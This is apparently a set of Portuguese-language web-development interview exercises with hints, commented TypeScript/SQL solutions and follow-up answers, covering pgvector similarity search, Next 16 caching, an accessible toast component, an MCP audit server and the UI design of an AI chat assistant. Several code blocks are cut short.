    Primeiro medir qual passo domina. Depois: cache do pnpm (já feito), cache remoto do Turborepo pra não refazer o que não mudou, rodar só o que o PR afetou (turbo --filter a partir da branch base), separar lint, typecheck e testes em jobs paralelos, e dividir a suíte lenta em partes (matrix ou --shard). O build do Next também tem cache (.next/cache) que vale guardar.

  3. Um PR vem de um fork. Ele tem acesso aos segredos?
    ver resposta

    Não, e é de propósito: no evento pull_request de um fork, os segredos não são entregues e o token é só de leitura. O perigo está no pull_request_target, que roda com os segredos do repositório base: nunca faça checkout e execute o código do PR nele. dica 1

A estrutura é: criar o McpServer com nome e versão, registrar a tool com registerTool(nome, config, handler), criar um StdioServerTransport e chamar server.connect(transport).

import { StdioServerTransport } from '@modelcontextprotocol/server/stdio';
import { z } from 'zod';
import { runAudit } from './audit';         // seu código: Puppeteer + axe-core
import { urlPermitida } from './url-guard'; // bloqueia localhost, IP privado e link-local

const server = new McpServer({ name: 'ally-audit', version: '0.1.0' });

server.registerTool(
  'audit_url',
  {
    description:
      'Audita a acessibilidade (WCAG 2.1) de uma página pública com axe-core e devolve ' +
      'as violações, da mais grave para a menos grave. Use quando o usuário pedir pra ' +
      'checar uma página. Não use para páginas que exigem login.',
    inputSchema: z.object({
      url: z.string().url().describe('URL pública, começando com https://'),

    return {
      content: [{ type: 'text', text: JSON.stringify(maisGraves, null, 2) }],
    };
  },
);

Perguntas que vêm depois
  1. Por que um console.log quebra um servidor MCP em stdio?
    ver resposta

    Porque no stdio o protocolo é o stdout: o cliente lê mensagens JSON-RPC linha a linha, e uma linha de log no meio vira JSON inválido. Todo log vai pra stderr (console.error) ou pra arquivo. Num servidor HTTP o problema não existe, porque o protocolo viaja na conexão e não no stdout.

  2. Quando eu levo esse servidor de stdio pra HTTP remoto, o que muda?
    ver resposta

O código da ferramenta quase não muda; o perímetro em volta dela muda quase tudo.

  3. E se a auditoria devolvesse um gráfico interativo em vez de JSON?
    ver resposta

    É o caso do MCP Apps: a ferramenta declara um recurso ui:// e o host o mostra num iframe isolado dentro da conversa, com comunicação por postMessage. Questões parecidas com pgvector

45 min · SQL + TS · R4

“Temos a tabela questions(id, stem, specialty) no Postgres. Quero o endpoint GET /api/similar?id=... que devolve as 5 questões mais parecidas com a pedida, da mesma especialidade, sem repetir a própria. Use o Gemini pra gerar os embeddings e o pgvector pra buscar. Crie a coluna, o índice, a consulta e o endpoint.”

Requisitos que você deve levantar

  • Qual a dimensão do vetor? Ela decide o armazenamento e se o índice cabe (vector indexa até 2.000 dimensões; o padrão do Gemini é 3.072).
  • Qual a métrica? Pra texto, distância de cosseno.
  • O filtro por especialidade vai junto do índice aproximado. Isso tem uma pegadinha.
  • Guardar o nome do modelo: trocar de modelo exige reindexar tudo.
  • Quando gerar o embedding: na criação da questão, num job, e não no request do usuário.

O que o entrevistador observa

  • Se você escolhe vector_cosine_ops com <=> e não mistura operador com classe do índice.
  • Se percebe que filtro + HNSW pode devolver menos linhas que o LIMIT.
  • Se o embedding da pergunta e o do documento usam o mesmo propósito de tarefa.
dica 1

768 dimensões com outputDimensionality cabe no índice e custa uns 3 KB por linha. No gemini-embedding-001 os vetores truncados não vêm normalizados: pra cosseno não importa, mas pra produto interno (<#>) você normaliza na mão.

dica 2

No HNSW, o filtro WHERE é aplicado depois do scan do índice. Se a especialidade tem 10% das linhas, o scan padrão traz poucos candidatos que casam. O pgvector tem hnsw.iterative_scan pra continuar buscando até completar o LIMIT.

solução comentada

O job que gera o embedding (no worker, na criação da questão)
import { GoogleGenAI } from '@google/genai';
import type { Pool } from 'pg';
import pgvector from 'pgvector';

const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
const MODELO = 'gemini-embedding-001';

async function embute(texto: string, tarefa: 'RETRIEVAL_DOCUMENT' | 'RETRIEVAL_QUERY') {
  const res = await ai.models.embedContent({
    model: MODELO,
    contents: texto,
    config: { outputDimensionality: 768, taskType: tarefa },
  });
  const valores = res.embeddings?.[0]?.values;
  if (!valores) throw new Error('embedding vazio');
  return valores;
}

export async function indexaQuestao(db: Pool, id: number, enunciado: string) {
  const v = await embute(enunciado, 'RETRIEVAL_DOCUMENT');
  await db.query(
    'UPDATE questions SET embedding = $1::vector, embedding_model = $2 WHERE id = $3',
    [pgvector.toSql(v), MODELO, id],
  );
}
A consulta e o endpoint
// app/api/similar/route.ts
import { NextResponse } from 'next/server';
import { db } from '@/lib/db';

export async function GET(req: Request) {
  const id = Number(new URL(req.url).searchParams.get('id'));
  if (!Number.isInteger(id)) return NextResponse.json({ erro: 'id inválido' }, { status: 400 });

  const cliente = await db.connect();
  try {
    await cliente.query('BEGIN');
    // com filtro, o scan do índice pode trazer menos linhas que o LIMIT: continua até completar
    await cliente.query("SET LOCAL hnsw.iterative_scan = 'relaxed_order'");
    const { rows } = await cliente.query(
      `SELECT id, stem,
              1 - (embedding <=> (SELECT embedding FROM questions WHERE id = $1)) AS similaridade
         FROM questions
        WHERE id <> $1
          AND specialty = (SELECT specialty FROM questions WHERE id = $1)
          AND embedding IS NOT NULL
        ORDER BY embedding <=> (SELECT embedding FROM questions WHERE id = $1)
        LIMIT 5`,
      [id],
    );
    await cliente.query('COMMIT');
    return NextResponse.json(rows);
  } finally {
    cliente.release();
  }
}

Detalhes pra mencionar: a consulta usa o embedding já salvo da questão (não chama o Gemini no request, então é rápida e de graça); o ORDER BY usa o mesmo operador da classe do índice e compara com uma subconsulta escalar, o formato que a documentação do pgvector usa para achar os vizinhos de uma linha, e que deixa o índice ser usado no ORDER BY; SET LOCAL vale só dentro da transação; e a pegadinha de entrevista é a dimensão: 3.072 (o padrão) não indexa em vector, então ou pede menos dimensões, ou indexa como halfvec (até 4.000).

Perguntas que vêm depois
  1. Isso é RAG?
    ver resposta

    É a metade da recuperação (R de retrieval). RAG completo é buscar os trechos relevantes e entregá-los ao modelo como contexto pra ele responder ancorado neles. Aqui o resultado vai pra interface como lista; se os 5 enunciados fossem colocados no prompt pra explicar um conceito comum a eles, aí sim seria RAG. Vale dizer também que os dois projetos já ancoram o prompt em dado real do banco, só que por filtro, não por similaridade.

  2. Trocamos de modelo de embedding. O que acontece?
    ver resposta

    Os vetores antigos deixam de ser comparáveis com os novos: cada modelo tem o seu espaço. É preciso reindexar tudo: reembutir cada linha (um job em lote, de preferência pela Batch API, que custa metade), gravar o nome do modelo novo e só então trocar a consulta. Por isso a coluna embedding_model: ela permite migrar aos poucos e saber o que ainda é do modelo velho.

  3. HNSW ou IVFFlat?
    ver resposta

    HNSW tem melhor relação velocidade e recall, não precisa de dados pra ser criado, e custa mais memória e tempo de build. IVFFlat constrói rápido e ocupa pouco, mas precisa ser criado depois de ter dados (ele aprende as listas) e consulta mais devagar. Na dúvida, e com tabela que cresce aos poucos, HNSW. Sem índice nenhum, a busca é exata e perfeita em recall, e pra uma tabela de poucos milhares de linhas isso costuma bastar.

    Como painel (o padrão em 'todo'), a violação aparece na interface do Storybook, mas nada falha: depende de alguém abrir e olhar. Refatorar uma busca no cliente pra Server Component com cache

“Esta página de questões foi escrita toda no cliente: busca no useEffect, tem estado de carregamento e de erro à mão, e as duas buscas acontecem uma depois da outra. A tela pisca ‘carregando’ a cada visita e o LCP está ruim. Reescreva pro App Router do Next 16 e explique o que muda.”

'use client';
import { useEffect, useState } from 'react';

export default function QuestoesPage() {
  const [questoes, setQuestoes] = useState<Questao[] | null>(null);
  const [stats, setStats] = useState<Stats | null>(null);
  const [erro, setErro] = useState(false);
  const [esp, setEsp] = useState('todas');

  useEffect(() => {
    (async () => {
      try {
        const q = await fetch(`/api/questoes?esp=${esp}`).then((r) => r.json());
        const s = await fetch('/api/minhas-estatisticas').then((r) => r.json()); // espera a de cima
        setQuestoes(q);
        setStats(s);
      } catch {
        setErro(true);
      }
    })();
  }, [esp]);

  if (erro) return <p>Erro</p>;

Requisitos que você deve levantar

  • Quais dados são compartilhados entre usuários (a lista de questões) e quais são da pessoa (as estatísticas)? Só o primeiro pode ser cacheado.
  • O filtro de especialidade pode virar parâmetro de URL (compartilhável, funciona com o botão voltar)?
  • As duas buscas são independentes: por que estão em fila?
  • O que continua precisando ser componente de cliente?

O que o entrevistador observa

  • Se você nomeia o waterfall e o corrige com Promise.all.
  • Se decide onde fica a fronteira Suspense e o que aparece enquanto o dado dinâmico chega.
  • Se sabe que dado de usuário não vai pra um cache compartilhado.
dica 1

No Next 16 com cacheComponents: true, nada é cacheado por padrão. Você marca a função com 'use cache' e define cacheLife e cacheTag. Dado que depende de cookies() ou searchParams é dinâmico e precisa estar atrás de um Suspense.

dica 2

A página pode receber searchParams como promessa e repassá-la a um componente que a resolve lá dentro, atrás do Suspense. Assim a casca (título e esqueleto) é estática e sai na hora.

solução comentada

import { Filtro } from './filtro';

export default function QuestoesPage({
  searchParams,

  searchParams: Promise<{ esp?: string }>;

  return (
    <>
      <h1>Questões</h1>                         {/* casca estática: sai na hora */}
      <Suspense fallback={<ListaSkeleton />}>
        <Conteudo searchParams={searchParams} />
      </Suspense>

async function Conteudo({ searchParams }: { searchParams: Promise<{ esp?: string }> }) {
  const { esp = 'todas' } = await searchParams;
  // independentes: em paralelo, não em fila
  const [questoes, stats] = await Promise.all([listarQuestoes(esp), estatisticasDoUsuario()]);
  return (
    <>
      <Filtro atual={esp} />
      <Lista questoes={questoes} stats={stats} />

// lib/questoes.ts
import { cacheLife, cacheTag } from 'next/cache';
import { cookies } from 'next/headers';

export async function listarQuestoes(esp: string) {
  'use cache';                 // dado COMPARTILHADO: pode ficar em cache
  cacheLife('minutes');
  cacheTag('questoes');        // uma Server Action invalida por esta tag quando editar uma questão
  return db.questao.findMany({ where: esp === 'todas' ? {} : { especialidade: esp } });
}

export async function estatisticasDoUsuario() {
  // sem 'use cache': depende da sessão (cookies), então é dinâmico e fica atrás do Suspense
  const sessao = (await cookies()).get('sessao')?.value;
  return db.estatisticas.porSessao(sessao);
}

Perguntas que vêm depois
  1. Então nunca mais uso useEffect pra buscar dado?
    ver resposta

    Quase nunca pra carga inicial. Ainda faz sentido buscar no cliente quando o dado depende de interação contínua ou de algo que só existe no navegador (posição do mouse, tamanho da janela, um pedido que o usuário dispara a cada tecla), e aí o ideal é uma biblioteca de dados de servidor no cliente (TanStack Query), que cuida de cache, deduplicação, refetch e erro, em vez de efeito escrito à mão. O que sai do useEffect é a carga inicial da página.

  2. Como a lista em cache é atualizada quando alguém edita uma questão?
    ver resposta

    Pela tag: a Server Action que grava a edição chama revalidateTag('questoes', 'max') (que marca como velho e serve o antigo enquanto regenera) ou updateTag (quando a própria pessoa precisa ver a mudança na hora). O cacheLife é o teto de segurança, a tag é a invalidação precisa. Em várias instâncias, o cache tem que ser compartilhado, senão cada uma invalida só a sua (ver R5).

  3. O que acontece se eu acessar cookies() fora de um Suspense?
    ver resposta

    Com Cache Components ligado, o Next recusa em tempo de build: dado dinâmico fora de uma fronteira Suspense obriga você a decidir. Ou o dado é cacheado, ou existe um fallback pra mostrar enquanto ele chega. O efeito é o PPR por padrão: casca estática pré-renderizada e buracos dinâmicos preenchidos no request.

dica 1

Dois contêineres sempre presentes: um com role="status" pros avisos e outro com role="alert" pros erros. O toast é adicionado dentro deles; criar o contêiner junto com o toast faz o leitor de tela não anunciar nada.

dica 2

Pra pausar o tempo, guarde quanto faltava: ao pausar, subtraia o que já passou; ao retomar, agende só o resto. Um setTimeout reiniciado do zero a cada hover nunca fecharia um toast que o mouse visita.

import { useEffect, useRef, useState, useCallback } from 'react';

export type Toast = {
  id: string;
  tipo: 'info' | 'erro';
  titulo: string;
  descricao?: string;
  desfazer?: () => void;
  saindo?: boolean;
};

export function useToasts() {
  const [toasts, setToasts] = useState<Toast[]>([]);
  const mostrar = useCallback((t: Omit<Toast, 'id' | 'saindo'>) => {
    setToasts((ts) => [...ts, { ...t, id: crypto.randomUUID() }]);
  }, []);
  const fechar = useCallback((id: string) => {          // 1º passo: marca pra animar a saída
    setToasts((ts) => ts.map((t) => (t.id === id ? { ...t, saindo: true } : t)));
  }, []);
  const remover = useCallback((id: string) => {          // 2º passo: tira do DOM
    setToasts((ts) => ts.filter((t) => t.id !== id));
  }, []);
  return { toasts, mostrar, fechar, remover };
}

export function Toaster({ toasts, fechar, remover }: {
  toasts: Toast[]; fechar: (id: string) => void; remover: (id: string) => void;
}) {
  const lista = (tipo: Toast['tipo']) =>
    toasts.filter((t) => t.tipo === tipo).map((t) => (
      <ToastItem key={t.id} toast={t} fechar={fechar} remover={remover} />
    ));
  return (
    <section aria-label="Notificações" className="toasts">
      {/* as duas regiões existem SEMPRE, vazias ou não: é isso que faz o anúncio funcionar */}
      <div role="status" className="toasts-lista">{lista('info')}</div>
      <div role="alert" className="toasts-lista">{lista('erro')}</div>
    </section>
  );
}

function ToastItem({ toast, fechar, remover }: {
  toast: Toast; fechar: (id: string) => void; remover: (id: string) => void;
}) {
  const [pausado, setPausado] = useState(false);
  const restante = useRef(5000);
  const inicio = useRef(0);

  // contagem de 5 s que pausa em hover/foco e retoma de onde parou
  useEffect(() => {
    if (pausado || toast.saindo) return;
    inicio.current = Date.now();
    const t = setTimeout(() => fechar(toast.id), restante.current);
    return () => {
      clearTimeout(t);
      restante.current -= Date.now() - inicio.current;
    };
  }, [pausado, toast.saindo, toast.id, fechar]);

  // depois da animação de saída, remove; o timer de segurança cobre quem desligou animação
  useEffect(() => {
    if (!toast.saindo) return;
    const t = setTimeout(() => remover(toast.id), 400);
    return () => clearTimeout(t);
  }, [toast.saindo, toast.id, remover]);

  return (
    <div
      className="toast"
      data-saindo={toast.saindo ? 'true' : 'false'}
      onMouseEnter={() => setPausado(true)}
      onMouseLeave={() => setPausado(false)}
      onFocus={() => setPausado(true)}
      onBlur={() => setPausado(false)}
      onKeyDown={(e) => { if (e.key === 'Escape') fechar(toast.id); }}
      onAnimationEnd={() => { if (toast.saindo) remover(toast.id); }}
    >
      <span aria-hidden="true" className="toast-icone">{toast.tipo === 'erro' ? '!' : 'i'}</span>
      <div className="toast-texto">
        <p className="toast-titulo">{toast.titulo}</p>
        {toast.descricao && <p className="toast-desc">{toast.descricao}</p>}
      </div>
      {toast.desfazer && (
        <button type="button" className="toast-acao" onClick={() => { toast.desfazer?.(); fechar(toast.id); }}>
          Desfazer
        </button>
      )}
      <button type="button" className="toast-fechar" aria-label="Fechar notificação" onClick={() => fechar(toast.id)}>
        <span aria-hidden="true">&times;</span>
      </button>
    </div>
  );
}

Decisões pra verbalizar: o toast não rouba o foco (quem está digitando continua digitando); as regiões status e alert existem desde o carregamento da página; a pausa em hover e em foco atende a WCAG 2.2.1 (o usuário controla o tempo); o botão fechar tem nome acessível porque o × é decorativo; só transform e opacity animam; e o texto do toast tem contraste calculado sobre surface-inverse, não sobre o fundo da página. Pra uma ação que a pessoa precisa tomar, um toast que some sozinho é o componente errado: use um diálogo ou um aviso que fica.

Perguntas que vêm depois
  1. Por que dois contêineres, status e alert?
    ver resposta

    São urgências diferentes. role="status" é aria-live="polite": o leitor de tela espera terminar o que está lendo e então anuncia (bom pra “Salvo”). role="alert" é assertive: interrompe (reservado a erro que impede a pessoa de seguir). Tudo como alert vira ruído e treina o usuário a ignorar o anúncio.

  2. O toast some em 5 s. Isso é aceitável?
    ver resposta

    Só com controle. A WCAG 2.2.1 (Timing Adjustable) pede que quem precisa de mais tempo consiga pausar, estender ou desligar o limite; por isso pausa em hover e em foco. E o tempo depende do conteúdo: uma confirmação curta (“Salvo”) aguenta 5 s; um aviso com ação (“Desfazer”) merece mais, ou ficar até ser dispensado. Informação que a pessoa não pode perder nunca deve estar só num toast.

  3. O mock só trazia o estado feliz. O que você leva de volta pra designer?
    ver resposta

    Os estados que faltam: erro (cor e ícone que não dependam só de cor), toast com descrição longa (quebra de linha e limite), vários empilhados (o máximo visível e o que acontece com o excedente), tela estreita, tema claro e escuro, e o movimento reduzido. É uma conversa curta, com os tokens e as stories na mão, e o resultado vira variante documentada no Storybook, não um combinado de reunião.

System design: a interface de um assistente de IA

“Desenhe a interface de um assistente tipo ChatGPT dentro do nosso produto”

1 · Requisitos

Pergunte antes de desenhar (com a premissa que você assume se o entrevistador devolver a pergunta):

  • Web, mobile ou os dois? → web responsiva.
  • Só texto, ou o assistente usa ferramentas e mostra componentes? → texto e algumas ferramentas (Generative UI).
  • Conversas ficam salvas? Compartilháveis? → salvas por usuário, sem compartilhamento na v1.
  • Anexos (arquivo, imagem)? → fora da v1, mas o modelo de dados não pode impedir.
  • Escala e público? → milhares de usuários simultâneos, internacional, muito uso em celular.

Funcionais: enviar mensagem e ver a resposta em streaming; parar; regenerar; histórico de conversas com título; copiar resposta e código; feedback (👍/👎 com motivo); resultados de ferramenta como componentes.

Não funcionais (com número, que é o que diferencia): primeiro token visível em menos de 1 s no p75; INP abaixo de 200 ms enquanto o stream roda; conversa com 300+ mensagens sem travar; acessível por teclado e leitor de tela; nenhum rascunho perdido se a aba fechar.

5 · Otimizações (onde a entrevista é decidida)

  • Renderização do stream. Deltas acumulados e pintados uma vez por quadro. Markdown incremental: blocos já fechados são memoizados e só o último é reprocessado. Realce de código carregado sob demanda e aplicado quando o bloco fecha.
  • Rolagem. Gruda no fim só se o usuário já estava no fim; se ele subiu pra ler, a tela não pula, e aparece um botão “ir pro fim”. Reserve espaço pra não empurrar o layout (CLS).
  • Conversa longa. Paginação pra cima por cursor e virtualização da lista (com altura variável medida) ou content-visibility: auto como passo mais barato.
  • Bundle. O composer é interativo primeiro; markdown, realce de sintaxe e fórmulas são carregados depois, sob demanda.
  • Erros e estados. Status por mensagem, não global: uma resposta com erro não trava as outras. Texto parcial preservado, “tentar de novo” por mensagem, 429 com “tente em X s”, aviso de offline, rascunho salvo no localStorage por conversa.
  • Acessibilidade. Não anunciar token a token (vira ruído): a mensagem em andamento fica com aria-busy e uma região role="status" anuncia “resposta pronta” no fim. O foco fica no composer. Enter envia, Shift+Enter quebra linha, Esc para. O cursor piscando respeita prefers-reduced-motion. Botões de ícone (copiar, regenerar) com nome acessível.
  • Segurança. Saída do modelo é entrada não confiável: markdown sem HTML cru, imagens externas bloqueadas ou passando por proxy (canal de exfiltração por prompt injection), links com domínio visível, CSP restrita, ação sensível com aprovação exigida no servidor.
  • Métricas. Tempo até o primeiro token (TTFT), tokens por segundo, taxa de erro por código, taxa de “parar” e de “regenerar” (sinal de resposta ruim), feedback 👍/👎 por motivo, custo por conversa.

  • A decisão de transporte com o motivo e com o que mudaria a decisão.

Perguntas que o entrevistador faz depois
  1. O usuário fecha a aba no meio da resposta. O que acontece no servidor?
    ver resposta

    É uma escolha de produto com custo. Cancelar: o servidor percebe a desconexão (request.signal abortado), para a geração, grava o parcial como incomplete e para de gastar tokens. Continuar: a geração termina e é gravada, e ao reabrir a conversa a resposta está inteira (é o que os assistentes grandes fazem). Continuar exige que a geração não dependa da conexão (fila ou processo próprio) e, idealmente, stream retomável pelo messageId.

  2. Como implementar “regenerar” sem perder a resposta anterior?
    ver resposta

    A conversa vira uma árvore: regenerar cria uma mensagem irmã com o mesmo parentId, e a interface mostra “2/3” com setas pra alternar. Editar uma pergunta antiga cria um novo ramo a partir dela. O que aparece na tela é um caminho da raiz até a folha selecionada, e o histórico mandado ao modelo é esse caminho, não todas as mensagens.

  3. Uma resposta de 5 mil tokens com muito código deixa a página engasgando. Como você investiga e resolve?
    ver resposta

    Grava um perfil no painel Performance com o stream rodando e procura long tasks. O suspeito número um é reprocessar o markdown inteiro e reaplicar o realce a cada delta, que cresce com o tamanho. Remédios na ordem: pintar uma vez por quadro, memoizar blocos fechados, realçar só quando o bloco de código fecha (ou num worker), e virtualizar se a conversa também for longa. A confirmação é o INP medido durante o stream, antes e depois.

  4. Como você testaria essa interface?
    ver resposta

    Na base, o parser de SSE com o teste que corta a resposta em todos os pontos (exercício 1). Depois, o store e os componentes com um stream falso (Testing Library, consultas por papel). No topo, Playwright com page.route devolvendo um corpo SSE gravado: fluxo de enviar, parar, erro com retry e aprovação, mais @axe-core/playwright. E um contrato dos eventos (schema Zod na borda) pra o front quebrar no teste, e não em produção, quando o back-end mudar o formato.
